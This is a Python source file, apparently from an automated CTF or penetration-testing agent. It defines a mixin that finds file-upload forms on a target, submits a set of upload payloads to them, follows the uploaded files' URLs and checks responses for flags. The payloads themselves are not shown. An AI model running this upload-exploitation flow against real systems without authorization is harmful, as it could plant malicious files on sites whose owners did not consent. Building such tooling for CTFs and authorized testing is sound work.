"""Generic upload exploitation chain orchestration."""

from __future__ import annotations

from typing import Any

from ..dispatcher_helpers import _base_target, _parse_forms_from_html
from .base import _ChainOutcome


class UploadChainMixin:
    """Upload route wrapper and generic file-upload probing flow."""

    async def _execute_upload_chain(
        self,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        forms = list(page_features.get("forms") or [])
        if not forms:
            resp = await self._runtime_proxy_action(
                "get",
                url=target,
                timeout=12,
                audit_target=target,
                audit_metadata={"phase": "upload_chain", "stage": "fetch_forms"},
            )
            if isinstance(resp, dict) and not resp.get("error"):
                body = str(resp.get("body") or "")
                final_url = str(resp.get("final_url") or target)
                forms = _parse_forms_from_html(body, final_url)
                await self._scan_and_store(body, final_url, evidence_source="http-response", page_features=page_features)

        upload_forms = [
            form
            for form in forms
            if any(
                isinstance(item, dict)
                and str(item.get("type") or "").strip().lower() == "file"
                and str(item.get("name") or "").strip()
                for item in (form.get("inputs") or [])
            )
        ]
        if not upload_forms:
            return _ChainOutcome(progress=False, reason="upload chain: no file input form discovered")

        progress = False
        reasons: list[str] = []
        for form in upload_forms[:2]:
            action_url = self._form_action_url(target, form)
            data_fields = self._default_upload_form_fields(form)
            file_fields = [
                str(item.get("name") or "").strip()
                for item in (form.get("inputs") or [])
                if isinstance(item, dict)
                and str(item.get("type") or "").strip().lower() == "file"
                and str(item.get("name") or "").strip()
            ]
            if not file_fields:
                continue

            for payload in self._generic_upload_payloads():
                files = {
                    field_name: {
                        "filename": payload["filename"],
                        "content": payload["content"],
                        "content_type": payload["content_type"],
                    }
                    for field_name in file_fields[:1]
                }
                response = await self._runtime_proxy_action(
                    "request",
                    method=str(form.get("method") or "POST").upper(),
                    url=action_url,
                    data=data_fields,
                    files=files,
                    timeout=20,
                    audit_target=action_url,
                    audit_metadata={
                        "phase": "upload_chain",
                        "filename": payload["filename"],
                        "fields": sorted(file_fields[:1]),
                    },
                )
                if not isinstance(response, dict) or response.get("error"):
                    continue
                body = str(response.get("body") or "")
                final_url = str(response.get("final_url") or action_url)
                status = int(response.get("status_code") or 0)
                progress = progress or status > 0
                await self._scan_and_store(body, final_url, evidence_source="http-response", page_features=page_features)
                if self.state is not None:
                    self.state.add_observation(
                        "upload_attempt",
                        payload["filename"],
                        source="upload_chain",
                        metadata={
                            "strategy_kind": "upload_chain",
                            "status_code": status,
                            "action_url": action_url,
                            "final_url": final_url,
                        },
                    )

                if flag := self._extract_flag(body):
                    verification = await self._observe_flag(
                        flag,
                        final_url,
                        evidence_source="http-response",
                        rationale=f"upload response: {payload['filename']}",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(progress=True, flag=verification.flag, reason="upload response flag")

                follow_urls = self._upload_followup_urls(
                    base=base,
                    response_body=body,
                    response_url=final_url,
                    filename=str(payload["filename"]),
                )
                follow = await self._follow_uploaded_payloads(follow_urls, payload["filename"], page_features)
                progress = progress or follow.progress
                if follow.flag:
                    return follow
                if follow.reason:
                    reasons.append(follow.reason)

        if progress:
            return _ChainOutcome(progress=True, reason="upload attempts exhausted; " + "; ".join(reasons[:3]))
        return _ChainOutcome(progress=False, reason="upload chain made no successful request")
